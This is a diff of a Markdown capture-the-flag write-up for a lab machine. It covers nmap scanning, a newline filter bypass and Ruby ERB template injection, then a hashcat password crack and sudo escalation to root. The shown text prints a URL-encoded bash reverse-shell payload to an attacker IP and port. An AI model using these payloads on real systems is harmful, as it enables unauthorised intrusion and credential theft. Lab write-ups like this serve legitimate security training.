@@ -8,11 +8,11 @@ Target IP: 10.10.11.253
 
 ## Enumeration and reconnaissance
 As always we start enumerating the target machine 
-```
+``` bash
 nmap -sS -p- -n --min-rate 5000 -vvv -oG open_ports 10.10.11.253
 ```
 After finding ports 22 (SSH) and 80 (HTTP) open we use nmap script engine to obtain more information, such as services running, versions and any information the default scripts may retrieve
-```
+``` bash
 nmap -sCV -p22,80 -vvv --min-rate 5000 -n -oN target_ports 10.10.11.253
 ```
 We don't see much more valuable information, so let's explore the http server.
@@ -25,27 +25,34 @@ Using Burpsuite we can try to tamper with the payload request, modifying either 
 But something caught up my attention, when using special characters in the payload, such as `'<%(`, we received a response saying "invalid input". 
 Doing some reasearch online it appears that using `%0A` work as a payload bypass.
 
-Now that we can bypass this security we should look into potential payloads to vulnerate the machine. Given that the application is doing math operations and thanks to the server response we can see it's using Ruby, let's try some simple Serve Side Template Injection [payloads](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#erb-ruby).
+Now that we can bypass this security we should look into potential payloads to vulnerate the machine. Given that the application is doing math operations and thanks to the server response we can see it's using Ruby, let's try some simple Serve Side Template Injection 
+[payloads](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#erb-ruby).
 
 The image below shows both the characters used for bypass and the STTI payloads. As we can see in the responsem the first two STTI payloads didn't work out, but the third one did: `<%= 7*7 %>`. One very important detail is that it's URL encoded, so `<%= 7*7 %>` --URL-enconding--> `<%25%3d+7*7+%25>`
 
-![SSTI Payload](imgs/SSTI-payloads.png)
+<div style="text-align: center;">
+  <img src="imgs/SSTI-payloads.png" alt="SSTI Payload" />
+</div>
 
-We were able to execute code in the target machine!!
+We were able to **execute code in the target machine**!!
 
 Now let's craft a payload that will give us access to the machine:
-```
+``` bash
 system("bash -c 'bash -i >& /dev/tcp/<MY-IP>/443 0>&1'")
-# And let's URL encode that
+# And let's URL encode that (use your tool of preference)
+# Only encoding the special characters is enough
 <%25%3d+system("bash -c 'bash+-i+>%26+/dev/tcp/10.10.14.33/443+0>%261'")+%25>
 ```
 
 On the host machine we start a listener on the same port using netcat
 `nc -nlvp 443` and go back to Burpsuite and send the request. It's okey if we don't see any reponse from the server on Burpuiste, we should go to the listener terminal and verify we received a connection from the target machine.
-![Reverse shell payload](imgs/payload.png)
+
+<div style="text-align: center;">
+  <img src="imgs/payload.png" alt="Reverse shell payload" />
+</div>
 
 As the user 'susan' we can access the `user.txt` flag.
-```
+``` bash
 > nc -nlvp 443
 susan@perfection:~/ruby_app$ ls ~/
 ls ~/
@@ -72,22 +79,23 @@ Susan password hash:
 So knowing the hash password along with the format schema we previously found we can use hashcat and build a mask that matches the password format hoping to crack the hash.
 
 Hashcat command
-```
+``` bash
 hashcat -m 1400 -a 3 <HASH-FILE> susan_nasus_?d?d?d?d?d?d?d?d?d
 ```
 `-m 1400:` the mode 1400 is SHA2-256, the same the SSH server was using acording to nmap \
 `- a 3:` we select brute force as attack mode
 As per the mask, more information can be found [here](https://hashcat.net/wiki/doku.php?id=mask_attack), the most important thing is we want to match numbers only.
 
-![Cracking the hash with hashcat](imgs/hashcat-passwd.png)
-
+<div style="text-align: center;">
+  <img src="imgs/hashcat-passwd.png" alt="Cracking the hash with hashcat" />
+</div>
 
 Once hashcat cracks the hash we obtain the password. What can we do with that?
 Well one of the goes-to when compromising a machine is running `sudo -l` to see what commands we can run as sudo.
 It happens that susan can ran every command as sudo!!
 
 So we just run
-```
+``` bash
 # switch to root user
 > sudo su
 > whoami
@@ -95,7 +103,7 @@ root
 > cat /root/root.txt
 ```
 
-### Summary
+## Summary
 
 We were able to compromise this machine because of the following vulnerabilities:
 
